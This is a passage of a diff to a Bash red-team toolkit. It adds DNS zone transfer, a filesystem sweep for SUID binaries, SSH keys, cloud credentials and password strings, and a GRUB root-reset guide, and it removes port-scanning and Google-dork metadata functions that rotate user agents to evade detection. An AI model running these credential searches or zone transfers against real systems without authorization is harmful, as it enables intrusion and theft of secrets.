@@ -65,7 +65,7 @@
     # Use responsibly and only on authorized systems.
     #
 # Version
-VERSION="0.23.000"
+VERSION="0.23.101"
 # Darth Release
 RELEASE="ANAKIN"
 #* ====== CONSTANTS ======
@@ -525,8 +525,6 @@ RELEASE="ANAKIN"
     }
 
 #* ====== MAIN SCRIPTS (A-Z) ======
-    #! TODO: ORDER ALPHABETICALLY ALL THE FUNCTIONS BELOW
-    
     # Function: ARP Network Scan
     function arp_network_scan() {
         # arp_network_scan - Fast LAN Discovery using ARP
@@ -633,255 +631,341 @@ RELEASE="ANAKIN"
         echo "[*] Configure NETWORK_RANGE, INTERFACE, and other settings before running."
         echo "[*] To start manually, use: $daemon_file &"
     }
-
-    # Function: Script to perform a port scan on a network using netcat
-    function portscan() {
-        # i_portscan - Script to perform a port scan on a network using netcat
+    
+    # Function: Perform DNS Zone Transfer for reconnaissance
+    function dns_zt() {
+        # v_dns_zt - Perform DNS Zone Transfer for reconnaissance
             #
             # Description:
-            # This script performs the following operations:
-            # 1. Checks for common open ports on all hosts within a specified IP range (CIDR format).
-            # 2. Dynamically loads a user-defined number of top ports (e.g., 20, 100, 1000) from Nmap's services file, if available.
-            # 3. Falls back to a predefined list of common ports if Nmap's file is unavailable.
-            # 4. Prints results for each host and open port found.
-            # 5. Saves the results in two file formats:
-            #    - Plain text (`portscan_results.txt`) for human-readable output.
-            #    - CSV (`portscan_results.csv`) for structured data analysis.
+            # This script automates a DNS Zone Transfer (a DNS recon technique) to attempt retrieval of all DNS zone records 
+            # from the target's DNS server. It is a useful reconnaissance step when exploring the DNS structure of a domain.
+            # 
+            # Steps:
+            # 1. Prompts the user to input the target domain or URL (e.g., example.com).
+            # 2. Retrieves the nameservers (NS records) for the specified domain.
+            # 3. Iterates over each nameserver and attempts a DNS Zone Transfer.
             #
             # Dependencies:
-            # - netcat (nc): To perform the port scanning.
-            # - ipcalc: To validate and parse CIDR-based network masks.
-            # - awk: To process data from Nmap's services file.
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-23
-            # Last Updated: 2025-01-24
-            # Version: 1.2
-            #
-            # Version history:
-            # - 1.0 (2025-01-23): Initial version with basic port scanning functionality.
-            # - 1.1 (2025-01-23): Added support for saving results in `.txt` and `.csv` formats.
-            #                     Integrated dynamic port loading from Nmap's services file.
-            # - 1.2 (2025-01-23): Added user input to define the number of top ports to scan.
-            #                     Improved flexibility and user control over scan depth.
+            # - `host`: A tool used to query DNS records and perform the zone transfer.
             #
             # Notes:
-            # - Ensure the required dependencies are installed before running the script.
-            # - If `ipcalc` is not installed, the script will attempt to install it automatically.
-            # - Users can dynamically select the number of top ports to scan.
-            # - Results are saved in the current working directory as `portscan_results.txt` and `portscan_results.csv`.
-            # - Handles Ctrl+C interruptions gracefully and returns to the main menu.
-            #
-            # Example usage:
-            # - Input:
-            #   - Number of ports: 100
-            #   - CIDR: "192.168.1.0/24"
-            # - Output:
-            #   - Terminal: "Host: 192.168.1.1 - Open Port: 80"
-            #   - Text File: "Host: 192.168.1.1 - Open Port: 80"
-            #   - CSV File: "192.168.1.1,80,Open"
-
-        clear
-        echo -e "${MAGENTA}1 - Portscan using netcat ${RESET}"
-        echo -e "${GRAY}+======================================================================+${RESET}"
-        echo -e "${GRAY}This port scan checks common open ports on all hosts in the network."
-        echo -e "${GRAY}+======================================================================+${RESET}"
-
-        # Ask the user how many top ports they want to scan
-        echo -ne "${CYAN}Enter the number of top ports to scan (e.g., 20, 100, 1000): ${RESET}"
-        read -r TOP_PORTS
-
-        # Validate the user's input (ensure it's a positive number)
-        if ! [[ "$TOP_PORTS" =~ ^[0-9]+$ ]] || [[ "$TOP_PORTS" -le 0 ]]; then
-            echo -e "${RED}Invalid input! Please enter a positive number.${RESET}"
-            main_menu
-            return
-        fi
-
-        # Load ports dynamically from Nmap or use a fallback list
-        local nmap_services="/usr/share/nmap/nmap-services" # Path to Nmap's services file
-        local fallback_ports="80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900"
-
-        if [[ -f "$nmap_services" ]]; then
-            # Extract the top N ports based on the user's choice
-            PORT_LIST=$(awk '!/^#/ {print $2}' "$nmap_services" | grep -Eo '^[0-9]+' | sort -n | uniq | head -n "$TOP_PORTS" | paste -sd ',')
-
-            if [[ -n "$PORT_LIST" ]]; then
-                echo -e "${GREEN}Loaded the TOP $TOP_PORTS ports from Nmap's services file: $nmap_services${RESET}"
-            else
-                echo -e "${YELLOW}Warning: Failed to extract ports from Nmap's services file. Falling back to predefined ports.${RESET}"
-                PORT_LIST="$fallback_ports"
-            fi
-        else
-            echo -e "${YELLOW}Warning: Nmap services file not found at $nmap_services. Falling back to predefined ports.${RESET}"
-            PORT_LIST="$fallback_ports"
-        fi
-
-        # Handle Ctrl+C interruptions gracefully
-        trap 'echo -e "\nScript interrupted by user."; main_menu; exit 1' SIGINT
-
-        # Ask user to enter the IP range in CIDR notation
-        echo -ne "${CYAN}Enter the IP range in CIDR notation (e.g., 192.168.1.0/24): ${RESET}"
-        read -r NETWORK_MASK
-
-        # Validate the network mask
-        if ! ipcalc -n -b -m "$NETWORK_MASK" >/dev/null 2>&1; then
-            echo "Invalid network mask."
-            main_menu
-            return
-        fi
-
-        # Extract the network prefix from the mask
-        NETWORK_PREFIX=$(ipcalc -n -b "$NETWORK_MASK" | awk '/Network/ {print $2}' | awk -F. '{print $1"."$2"."$3}')
-
-        # Start scanning each host in the network for the specified ports
-        echo -e "${CYAN}Scanning network: $NETWORK_MASK ${RESET}"
-        for HOST in $(seq 1 254); do
-            IP="$NETWORK_PREFIX.$HOST"
-            for PORT in $(echo "$PORT_LIST" | tr ',' ' '); do
-                # Check if the port is open on the host
-                nc -z -w 1 "$IP" "$PORT" 2>/dev/null
-                if [ $? -eq 0 ]; then
-                    echo -e "${GREEN}Host: $IP - Open Port: $PORT ${RESET}"
-                fi
-            done
-        done
-
-        # Completion message
-        echo -e "${GREEN}Scan completed for $NETWORK_MASK using the TOP $TOP_PORTS ports.${RESET}"
-        echo -e "${GRAY}Press ENTER to continue...${RESET}"
-        read -r
-        main
-    }
-
-    # Function: Script to analyze subdomains and WHOIS information for a website or a list of websites.
-    function parsing_html() {
-        # parsing_html - Script to analyze subdomains and WHOIS information for a website or a list of websites.
-            #
-            # Description:
-            # This script performs the following operations:
-            # 1. Extracts subdomains from an HTML page.
-            # 2. Retrieves IP addresses associated with each subdomain.
-            # 3. Fetches WHOIS information for each domain.
-            # 4. Generates a report with the results.
-            #
-            # Dependencies:
-            # - curl: To make HTTP requests.
-            # - dig: To retrieve IP addresses of subdomains.
-            # - whois: To get WHOIS information for domains.
-            # - nslookup: For DNS lookups.
+            # - Ensure this script is used only for ethical purposes with proper authorization.
+            # - Zone transfers may fail if DNS servers are configured securely to block unauthorized access.
             #
             # Author: R3v4N (w/GPT)
-            # Created on: 2024-01-15
-            # Last Updated: 2024-01-24
+            # Created on: 2025-01-25
+            # Last Updated: 2025-01-26
             # Version: 1.1
             #
-            # Version history:
-            # - 1.0 (2024-01-15): Initial version with basic subdomain and WHOIS functionality.
-            # - 1.1 (2024-01-24): Added dependency checks and updated timestamp format.
-            #
             # Example usage:
-            # - Input: https://example.com
-            # - Output: Subdomains, IP addresses, WHOIS information for each domain.
+            # - Input: example.com
+            # - Output: Lists the DNS zone records if the transfer is successful.
+            #
+            # Example results:
+            # - Nameserver: ns1.example.com
+            #   Zone Records:
+            #   - A records
+            #   - MX records
+            #   - TXT records
+            #
+            # Disclaimer:
+            # - Unauthorized use of this script is prohibited. Always ensure you have explicit permission before testing.
+        
+        # Function: Display menu to collect user input
+        function dns_zt_main_menu() {
+            clear;  # Clear the terminal for a clean interface
+            ascii_banner_art;  # Display an ASCII banner
+            echo -e "${MAGENTA} DNS Zone Transfer ${RESET}"  # Show the operation's name
+            subtitle;  # Add a decorative subtitle
+            echo -en "${RED} Enter the target domain or URL: ${RESET}"  # Ask for the target domain
+            read -r TARGET  # Store user input in the TARGET variable
+        }
+
+        # Function: Validate if nameservers exist for the target
+        function dnz_zt_check() {
+            # Fetch the nameservers (NS records) for the domain
+            NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')
+
+            # Check if any nameservers were found
+            if [[ -z "$NS_SERVERS" ]]; then
+                # If no nameservers are found, notify the user and return to the main menu
+                echo -e "${RED} No nameservers found for the domain $TARGET. ${RESET}"
+                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
+                read -r 2> /dev/null  # Wait for the user to press Enter
+                main_menu;  # Redirect back to the main menu
+                return  # Exit the function to prevent further execution
+            fi
+        }
+
+        # Function: Attempt a DNS Zone Transfer on each nameserver
+        function dns_zt_attack() {
+            # Loop through each nameserver and perform the zone transfer attempt
+            for SERVER in $NS_SERVERS; do
+                echo -e "${CYAN} Attempting zone transfer on nameserver: $SERVER ${RESET}"  # Notify the user of progress
+                host -l -a "$TARGET" "$SERVER"  # Run the zone transfer command for the current nameserver
+            done
+        }
+
+        # Function: Control the entire workflow of the DNS Zone Transfer operation
+        function dns_zt_workflow() {
+            dns_zt_main_menu;  # Collect user input
+            dnz_zt_check;  # Validate nameservers
+            dns_zt_attack;  # Perform the attack
+            pause_script;  # Pause and wait for user input before returning
+            main_menu;  # Return to the main menu
+        }
+
+        # Execute the DNS Zone Transfer workflow
+        dns_zt_workflow;
+    }
+
+    # Function: Find-base attack surface analysis
+    function find_based_attack_surface_analysis() {
+        # find_based_attack_surface_analysis - Automates Attack Surface Discovery using 'find'
+            #
+            # Description:
+            #   Automates system reconnaissance by searching for sensitive files, privilege escalation paths,
+            #   and hidden persistence mechanisms using the 'find' command.
+            #
+            # Key Features:
+            #   - Detects SUID/SGID binaries for Privilege Escalation
+            #   - Identifies world-writable or unowned files for exploitation
+            #   - Finds SSH keys, password files, and sensitive data for credential theft
+            #   - Locates hidden files, unusual permissions, and suspicious cron jobs
+            #   - Logs findings for Red Team and Forensics investigations
+            #
+            # Output:
+            #   - Displays results on-screen
+            #   - Saves findings to a structured log file
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-25
+            # Last Updated: 2025-01-30
+            # Version: 2.0
+            #
+            # Usage:
+            #   Run this function to automatically scan a system for attack vectors or forensic analysis.
             #
             # Notes:
-            # - Ensure the dependencies are installed before running the script.
-            # - The report is saved in a file named "result_<URL>_<date>.txt".
+            #   - Red Team: Helps identify misconfigurations & exploitation opportunities.
+            #   - Forensics: Helps detect persistence, exfiltration traces, and privilege abuse.
+            #   - Requires root privileges for full execution.
+            # Create log directory & file
+        title="Find-Based Attack Surface Analysis"  # Define the title for this operation
+        
+        function find_analysis_create_log_file() {
+            LOG_DIR="./logs"
+            mkdir -p "$LOG_DIR"
+            LOG_FILE="${LOG_DIR}/find_analysis_$(date +%d%m%Y_%H%M%S).log"
+            echo "Find-Based Attack Surface Analysis Log - $(date)" > "$LOG_FILE"
+            echo "===============================================" >> "$LOG_FILE"
+        }
+
+        function all_find_based_attack_functions() {
+            
+            # Privilege Escalation Checks
+            function privilege_escalation_checks() {
+                log_and_display "=== Searching for SUID/SGID binaries (Potential Privilege Escalation) ==="
+                    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            # World-Writable & Unowned Files
+            function world_writable_unowned_files() {
+                log_and_display "=== Searching for World-Writable Files (Top 500) ==="
+                    find / -type f -perm -o+w -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
+                log_and_display "=== Searching for Unowned Files (Top 500) ==="
+                    find / -nouser -o -nogroup -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
+            }
+
+            # Credential Discovery
+            function credential_discovery() {
+                log_and_display "=== Searching for SSH Keys ==="
+                    find / -type f -name "id_rsa*" 2>/dev/null | tee -a "$LOG_FILE"
+                log_and_display "=== Searching for Useful Files (Config files) ==="
+                    find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.cfg" -name "*.log" -o -name "*.db" -o -name "*.pem"  \)  -exec grep -i "password" {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            # Persistence Mechanisms
+            function persistence_mechanisms() {
+                log_and_display "=== Searching for Suspicious Cron Jobs ==="
+                    find /etc/cron* -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+                log_and_display "=== Searching for Startup Scripts (init.d, systemd, .bashrc) ==="
+                    find /etc/init.d /lib/systemd/system ~/.bashrc -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            # Hidden Files & Anti-Forensics
+            function hidden_files_detection() {
+                log_and_display "=== Searching for Hidden Files ==="
+                    find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /snap -o -path /var/lib/docker \) -prune -o -type f -name ".*" 2>/dev/null | tee -a "$LOG_FILE"
+                log_and_display "=== Searching for Files with Strange Timestamps ==="
+                    timeout 600s find / -type f -newermt "2025-01-01" -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            # Exfiltration Traces
+            function exfiltration_traces() {
+                log_and_display "=== Searching for Large Archive Files (Potential Data Exfiltration) ==="
+                    timeout 600s find / -type f \( -name "*.zip" -o -name "*.tar" -o -name "*.gz" -o -name "*.7z" \) -size +50M -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+                log_and_display "=== Searching for Files Accessed in the Last 24 Hours ==="
+                    find / -type f -atime -1 -size -5M -exec  ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            function log_tampering_detection() {
+                log_and_display "=== Searching for Recently Modified Logs ==="
+                    find /var/log -type f -mtime -1 -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            function sensitive_file_discovery() {
+                log_and_display "=== Searching for Sensitive Files (API Keys, Credentials, Configs) ==="
+                    find / -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.env' -o -name '*.ini' \) -exec grep -Ei 'senha|pass|password|secret|apikey|token' {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            function suspicious_executables_scripts() {
+                log_and_display "=== Searching for Suspicious Executables & Scripts ==="
+                    find /tmp /dev/shm /var/tmp -type f -executable -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
+            }
+
+            function container_cloud_artifacts() {
+                log_and_display "=== Searching for Cloud & Container Credentials ==="
+                    find / -type f \( -name 'config.json' -o -name 'credentials' -o -name '.dockercfg' -o -name '.kube/config' \) 2>/dev/null | tee -a "$LOG_FILE"
+            }
+
+            function caller_functions(){
+                privilege_escalation_checks
+                world_writable_unowned_files
+                credential_discovery
+                persistence_mechanisms
+                hidden_files_detection
+                exfiltration_traces
+                log_tampering_detection
+                sensitive_file_discovery
+                suspicious_executables_scripts
+                container_cloud_artifacts
+            }
+
+            caller_functions;
+
+        }
+
+        # Automated Execution of All Checks
+        function find_based_analysis_workflow() {
+            display_banner_inside_functions
+            all_find_based_attack_functions
+            log_and_display "=== Analysis Complete! Results saved to: $LOG_FILE ==="
+        }
+
+        # Execute the workflow
+        find_based_analysis_workflow
+    }
+
+    # Function: Find command examples
+    function find_command_examples() {
+
+        # find_command_examples - Display examples of the 'find' command for reconnaissance & automation
             #
+            # Description:
+            #   This function provides quick reference examples of using 'find' for:
+            #   - File discovery, privilege escalation, and hidden files detection.
+            #   - Searching based on permissions, user, group, modification/access times.
+            #   - Executing commands on discovered files.
+            #
+            # Notes:
+            #   - Useful for Red Teamers & Forensics Investigators.
+            #   - Helps automate common search operations.
+            #   - No actual scanning—this is just a reference tool.
+            #
+            # Author: R3v4N (w/GPT)
+            # Last Updated: 2025-02-01
+            # Version: 2.0
 
-        # Function to check if dependencies are installed
-        check_dependencies() {
-            local dependencies=("curl" "whois" "nslookup" "dig")
-            for dep in "${dependencies[@]}"; do
-                if ! command -v "$dep" &>/dev/null; then
-                    echo -e "${RED}Error: Dependency '$dep' is not installed.${RESET}"
-                    echo "Please install '$dep' before running this script."
-                    exit 1
-                fi
-            done
+        title="\tFind Command Examples"  # Define the title for this operation
+        function display_find_usage_section() {
+            local title="$1"
+            echo -e "${RED}# $title${RESET}"
+            echo
         }
 
-        # Call the dependency check function
-        check_dependencies
+        function all_find_examples(){
+            
+            function list_all_files() {
+                display_find_usage_section "List All Files in a Directory"
+                echo -e "${GREEN}$ find .${RESET}"
+                echo
+            }
 
-        # Prompt the user to input the desired website URL
-        echo -n "Enter the URL of the website to analyze (e.g.: businesscorp.com.br): "
-        read -r SITE
+            function find_files_by_maxdepth() {
+                display_find_usage_section "Find Files with Limited Depth"
+                echo -e "${GREEN}$ find /etc -maxdepth 1 -name '*.sh'${RESET}"
+                echo
+            }
 
-        # Store the current date and time in the specified format (day-hour-minutes-month-year)
-        timestamp=$(date +"%d%H%M%b%Y" | tr '[:lower:]' '[:upper:]') # Example: 241408JAN2024
-        output_file="result_${SITE}_${timestamp}.txt"
+            function find_specific_files() {
+                display_find_usage_section "Find Files by Name"
+                echo -e "${GREEN}$ find ./test -type f -name '<file*>'${RESET}"
+                echo
+            }
 
-        # Function to print text in color
-        print_color() {
-            local color=$1
-            local text=$2
-            echo -e "\e[0;${color}m${text}\e[0m"
+            function find_specific_directories() {
+                display_find_usage_section "Find Directories by Name"
+                echo -e "${GREEN}$ find ./test -type d -name '<directory*>'${RESET}"
+                echo
+            }
+
+            function find_hidden_files() {
+                display_find_usage_section "Find Hidden Files"
+                echo -e "${GREEN}$ find ~ -type f -name '.*'${RESET}"
+                echo
+            }
+
+            function find_by_permissions() {
+                display_find_usage_section "Find Files by Permissions"
+                echo -e "${GREEN}$ find / -type f -perm 0740 -exec ls -la {} 2>/dev/null \;${RESET}"
+                echo -e "${GREEN}$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;  # Find SUID files${RESET}"
+                echo
+            }
+
+            function find_by_user_group() {
+                display_find_usage_section "Find Files by User or Group"
+                echo -e "${GREEN}$ find . -user msfadmin${RESET}"
+                echo -e "${GREEN}$ find . -user msfadmin -name '*.txt'${RESET}"
+                echo -e "${GREEN}$ find . -group adm${RESET}"
+                echo
+            }
+
+            function find_by_time() {
+                display_find_usage_section "Find Files Modified/Accessed in the Last N Days"
+                echo -e "${GREEN}$ find / -mtime 5${RESET}  # Modified in the last 5 days"
+                echo -e "${GREEN}$ find / -atime 5${RESET}  # Accessed in the last 5 days"
+                echo
+            }
+
+            function find_and_execute() {
+                display_find_usage_section "Find and Execute Commands"
+                echo -e "${GREEN}$ find / -name '*.pdf' -type f -exec ls -lah {} \;${RESET}"
+                echo
+            }
+
+            function call_find_examples() {
+                list_all_files
+                find_files_by_maxdepth
+                find_specific_files
+                find_specific_directories
+                find_hidden_files
+                find_by_permissions
+                find_by_user_group
+                find_by_time
+                find_and_execute
+            }
+
+            call_find_examples
         }
 
-        # Function to extract subdomains from an HTML page
-        extract_subdomains() {
-            local site=$1
-            curl -s "$site" | grep -Eo '(http|https)://[^/"]+' | awk -F[/:] '{print $4}' | sort -u
+        function find_examples_workflow() {
+            display_banner_inside_functions
+            all_find_examples
+            exit_to_main_menu
         }
 
-        # Function to get the IP address of a subdomain
-        get_ip_address() {
-            local subdomain=$1
-            local ip_address
-            ip_address=$(host "$subdomain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
-            echo "$ip_address:$subdomain"
-        }
-
-        # Function to get WHOIS information for a domain
-        get_whois_info() {
-            local domain=$1
-            whois "$domain" | grep -vE "^\s*(%|\*|;|$|>>>|NOTICE|TERMS|by|to)" | grep -E ':|No match|^$'
-        }
-
-        # Function to get DNS lookup information for a domain
-        get_dns_info() {
-            local domain=$1
-            nslookup "$domain" 2>/dev/null | grep "Address" | awk '{print $2}' | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/, /g'
-        }
-
-        # Add the timestamp to the beginning of the output file
-        echo -e "Report generated on: $timestamp\n" > "$output_file"
-
-        # Analyze the provided site
-        print_color 33 "Analyzing subdomains for: $SITE"
-        subdomains=($(extract_subdomains "$SITE"))
-
-        # Check if any subdomains were found
-        if [ ${#subdomains[@]} -eq 0 ]; then
-            print_color 31 "No subdomains found for: $SITE"
-            echo "No subdomains found for: $SITE" >> "$output_file"
-        else
-            print_color 32 "Subdomains found:"
-            for subdomain in "${subdomains[@]}"; do
-                print_color 36 "$subdomain"
-
-                # Get IP address for the subdomain
-                ip_result=$(get_ip_address "$subdomain")
-                echo "$ip_result" >> "$output_file"
-
-                # Add WHOIS information
-                print_color 34 "WHOIS information for $subdomain"
-                get_whois_info "$subdomain" >> "$output_file"
-
-                # Add DNS lookup information
-                print_color 34 "DNS Lookup information for $subdomain"
-                get_dns_info "$subdomain" >> "$output_file"
-
-                echo -e "\n" >> "$output_file"
-            done
-        fi
-
-        # Completion message
-        print_color 32 "Analysis complete. Results saved to: $output_file"
-        echo -e "${GRAY}Press ENTER to continue${RESET}"
-        read -r 2>/dev/null
-        main_menu
+        find_examples_workflow
     }
 
     # Function: Script to automate Google hacking queries for reconnaissance
@@ -1051,1004 +1135,137 @@ RELEASE="ANAKIN"
         echo -e "${GRAY}Press ENTER to return to the main menu.${RESET}"
         read -r 2>/dev/null
         main_menu
-    }   
+    }
 
-    # Function: Perform metadata analysis for files on specific domains
-    function metadata_analysis() {
-        # Metadata Analysis - Perform metadata analysis for files on specific domains    
-            # ==============================================================================
-            # Metadata Analysis
-            # Version: 1.2 (2024-01-25)
-            # Author: R3v4N|0wL (jpgress@gmail.com)
-            #
-            # Description:
-            # This script automates the process of performing metadata analysis on files
-            #
-            # Description:
-            # This function automates the process of performing metadata analysis on files 
-            # retrieved from specified domains or websites. It performs the following steps:
-            # 1. Prompts the user for domain, file type, and an optional keyword for filtering.
-            # 2. Searches Google for URLs of the specified file type and downloads the files.
-            # 3. Extracts metadata fields (e.g., Author, Producer, Creator, MIME Type) using `exiftool`.
-            # 4. Organizes and summarizes the metadata into an easy-to-read format and exports to CSV.
-            # 5. Handles common errors like empty results or failed downloads to ensure a robust workflow.
-            #
-            # Dependencies:
-            # - `lynx`: Used for performing Google searches.
-            # - `wget`: Used for downloading files from the URLs found in the search results.
-            # - `exiftool`: Used for extracting metadata from downloaded files.
-            # - `grep`: Used for filtering and processing search results and metadata.
-            #
-            # Notes:
-            # - Ensure all dependencies are installed and accessible in your `$PATH`.
-            # - The function saves intermediate and final results to timestamped files and folders.
-            # - Random user-agent rotation is implemented for downloads to avoid detection.
-            #
-            # Example Usage:
-            # - Input:
-            #     Domain: `businesscorp.com.br`
-            #     File type: `pdf`
-            #     Keyword: `employee`
-            # - Output:
-            #     - Search results in `TIMESTAMP_filtered.txt`
-            #     - Downloaded files in `DOMAIN_TIMESTAMP/`
-            #     - Metadata summary in `DOMAIN_TIMESTAMP_metadata_summary.txt`
-            #     - Organized summary in `DOMAIN_TIMESTAMP_organized_metadata_summary.txt`
-            #     - Metadata CSV in `DOMAIN_TIMESTAMP_metadata_summary.csv`
-            #
-            # Version History:
-            # - 1.0 (2025-01-24): Initial implementation of metadata analysis workflow.
-            # - 1.1 (2025-01-25): Improved error handling, user-agent rotation, and metadata processing.
-            # - 1.2 (2025-01-25): Added structured output (CSV and organized summary) and validation.
-            #
-            # Author: R3v4N (w/ GPT assistance)
-            # ==============================================================================
+    # Function: Interactive Guide for Resetting Root Password via GRUB
+    function linux_root_password_reset() {
 
-        # This script sets the SEARCH variable to use the 'lynx' command-line web browser.
-        # The 'lynx' command is configured with the following options:
-        # -dump: Outputs the formatted document to standard output.
-        # -hiddenlinks=merge: Merges hidden links into the document.
-        # -force_html: Forces the document to be interpreted as HTML.
-        SEARCH="lynx -dump -hiddenlinks=merge -force_html"
-        
-        # Function to prompt the user for required input
-        function metadata_analysis_menu() {
-            clear;  # Clears the terminal screen to give a clean interface
-            ascii_banner_art;  # Displays a banner or logo at the top of the screen
-            
-            # Display the title of this analysis step with colored formatting
-            echo -e "${MAGENTA} 4 - Metadata Analysis ${RESET}"
-            
-            subtitle;  # Displays a subtitle or additional details about the script
+        title="\tLinux Root Password Reset via GRUB"  # Define the title for this operation
 
-            # Prompt the user to enter the domain or website they want to analyze (e.g., government or business domains)
-            echo -n " Enter the domain or extension to search (e.g., businesscorp.com.br): "
-            read -r SITE  # Read the user's input and store it in the SITE variable
+        # Define Reset Instructions for Each OS
+        function generate_reset_steps() {
+            local file="/tmp/root_reset_steps.txt"
+            echo "======================" > "$file"
+            echo "  ROOT PASSWORD RESET  " >> "$file"
+            echo "======================" >> "$file"
 
-            # Prompt the user to enter the file type they want to search for (e.g., PDFs, DOCX)
-            echo -n " Enter the file extension to search for (e.g., pdf): "
-            read -r FILE  # Read the user's input and store it in the FILE variable
+            echo -e "\n[Debian/Ubuntu]" >> "$file"
+            echo "  1. Restart the system." >> "$file"
+            echo "  2. Press 'e' at the GRUB menu." >> "$file"
+            echo "  3. Find the line starting with: linux boot..." >> "$file"
+            echo "  4. Replace 'ro quiet' with 'init=/bin/bash rw'" >> "$file"
+            echo "  5. Press Ctrl + X to boot." >> "$file"
+            echo "  6. Run: passwd root" >> "$file"
+            echo "  7. Reboot: reboot -f" >> "$file"
 
-            # Prompt the user to optionally specify a keyword to refine the search (e.g., specific topics or terms)
-            echo -n " [Optional] Enter a keyword to refine the search (e.g., user): "
-            read -r KEYWORD  # Read the user's input and store it in the KEYWORD variable
+            echo -e "\n[Red Hat (CentOS, Fedora, Alma, Rocky)]" >> "$file"
+            echo "  1. Restart the system." >> "$file"
+            echo "  2. Press 'e' at the GRUB menu." >> "$file"
+            echo "  3. Find the line starting with: linux16..." >> "$file"
+            echo "  4. Replace 'rghb quiet LANG=en_US.UTF-8' with 'init=/bin/bash rw'" >> "$file"
+            echo "  5. Press Ctrl + X to boot." >> "$file"
+            echo "  6. If SELinux blocks changes, run: setenforce 0" >> "$file"
+            echo "  7. Run: passwd root" >> "$file"
+            echo "  8. Reboot: reboot -f" >> "$file"
+
+            echo -e "\n[Arch Linux]" >> "$file"
+            echo "  1. Restart the system." >> "$file"
+            echo "  2. Press 'e' at the GRUB menu." >> "$file"
+            echo "  3. Locate the line starting with: linux ..." >> "$file"
+            echo "  4. Add 'init=/bin/bash' at the end of the line." >> "$file"
+            echo "  5. Press Ctrl + X to boot." >> "$file"
+            echo "  6. Run: mount -o remount,rw /" >> "$file"
+            echo "  7. Run: passwd root" >> "$file"
+            echo "  8. Reboot: reboot -f" >> "$file"
+
+            echo -e "\n[SUSE/OpenSUSE]" >> "$file"
+            echo "  1. Restart the system." >> "$file"
+            echo "  2. Press 'e' at the GRUB menu." >> "$file"
+            echo "  3. Locate the line starting with: linux ..." >> "$file"
+            echo "  4. Replace 'quiet' with 'init=/bin/bash'" >> "$file"
+            echo "  5. Press Ctrl + X to boot." >> "$file"
+            echo "  6. Run: passwd root" >> "$file"
+            echo "  7. Reboot: reboot -f" >> "$file"
+
+            echo -e "\n[FreeBSD]" >> "$file"
+            echo "  1. Restart the system." >> "$file"
+            echo "  2. At the boot menu, press 'Esc' for the loader prompt." >> "$file"
+            echo "  3. Type: boot -s" >> "$file"
+            echo "  4. When prompted for a shell, press 'Enter'." >> "$file"
+            echo "  5. Remount root filesystem as read-write: mount -u /" >> "$file"
+            echo "  6. Run: mount -a" >> "$file"
+            echo "  7. Run: passwd root" >> "$file"
+            echo "  8. Reboot: reboot" >> "$file"
+
+            echo "======================" >> "$file"
+            echo " File with instructions saved in: $file"
         }
 
+        function go_back(){
+            pause_script
+            submenu_linux_root_password_reset
+        }
 
-        function perform_search() {
-            # Helper function to log search results
-            function log_results() {
-                local file="$1"
-                if [[ -s "$file" ]]; then
-                    echo -e "${GREEN} Search successful. Results saved to $file ${RESET}"
-                else
-                    echo -e "${RED} No results found for the specified search criteria. ${RESET}"
-                    local raw_results_file="raw_results_${TIMESTAMP}.txt"
-                    echo -e "${RED} Raw search results saved to ${YELLOW}$raw_results_file ${RESET}"
-                    mv "$file" "$raw_results_file"  # Save the empty file as raw results for debugging
-                fi
-            }
-
-            # Generate the timestamp and file names
-            TIMESTAMP=$(date +%d%H%M%b%Y)
-            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
-
-            # Build the search query
-            local base_query="https://www.google.com/search?q=inurl:$SITE+filetype:$FILE"
-            if [[ -n "$KEYWORD" ]]; then
-                echo -e "${MAGENTA} Searching for $FILE files with \"$KEYWORD\" on $SITE... ${RESET}"
-                base_query+="+intext:$KEYWORD"
+        # Generate a QR Code with Steps
+        function generate_qr_code() {
+            if command -v qrencode &>/dev/null; then
+                cat /tmp/root_reset_steps.txt | qrencode -o /tmp/root_reset_qr.png
+                echo -e "${GREEN} QR Code saved to /tmp/root_reset_qr.png.${RESET}"
+                echo -e "${GRAY} Scan it with your phone before rebooting.${RESET}"
+                go_back
             else
-                echo -e "${MAGENTA} Searching for $FILE files on $SITE... ${RESET}"
-            fi
-
-            # Perform the search and filter results
-            echo ""
-            $SEARCH "$base_query" \
-                | grep -Eo 'https?://[^ ]+\.'"$FILE" \
-                | cut -d '=' -f2'' > "$FILTERED_RESULTS_FILE"
-
-            # Log the results
-            log_results "$FILTERED_RESULTS_FILE"
-        }       
-        
-        # Function to download files from the search results
-        function download_files() {
-            USER_AGENTS=(
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
-                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
